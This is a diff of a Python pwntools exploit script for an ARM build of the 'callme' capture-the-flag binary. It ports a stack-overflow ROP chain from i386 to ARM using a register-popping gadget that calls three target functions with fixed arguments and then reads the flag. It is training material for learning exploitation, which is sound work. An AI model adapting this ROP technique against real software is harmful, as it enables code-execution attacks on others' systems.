@@ -4,32 +4,24 @@ BINARY = "./callme_armv5"
 ELF = ELF(BINARY)
 
 context.os = "linux"
-context.arch = "i386"
+context.arch = "arm"
 context.binary = BINARY
 
 p = process(BINARY)
 
-rop = b"A" * 36
-rop += p32(ELF.symbols['callme_one'])
-rop += p32(pop3ret)
-rop += p32(0xdeadbeef)
-rop += p32(0xcafebabe)
-rop += p32(0xd00df00d)
+pop_r012_lr_pc = p32(0x10870) # pop {r0, r1, r2, lr, pc}
 
-rop += p32(ELF.symbols['callme_two'])
-rop += p32(pop3ret)
-rop += p32(0xdeadbeef)
-rop += p32(0xcafebabe)
-rop += p32(0xd00df00d)
+for func in ['callme_one', 'callme_two', 'callme_three']:
+    rop = b"A" * 36
+    rop += pop_r012_lr_pc
+    rop += p32(0xdeadbeef)
+    rop += p32(0xcafebabe)
+    rop += p32(0xd00df00d)
+    rop += p32(ELF.symbols['pwnme'])
+    rop += p32(ELF.symbols[func])
+    
+    p.sendline(rop)
+    log.success(f"ROPchain = {rop}")
 
-rop += p32(ELF.symbols['callme_three'])
-rop += p32(pop3ret)
-rop += p32(0xdeadbeef)
-rop += p32(0xcafebabe)
-rop += p32(0xd00df00d)
-
-p.sendline(rop)
-log.success(f"ROPchain = {rop}")
-
-flag = p.recvall().split(b'\n')#[-2]
+flag = p.recv().split(b'\n')#[-2]
 log.success(f"FLAG : {flag}")
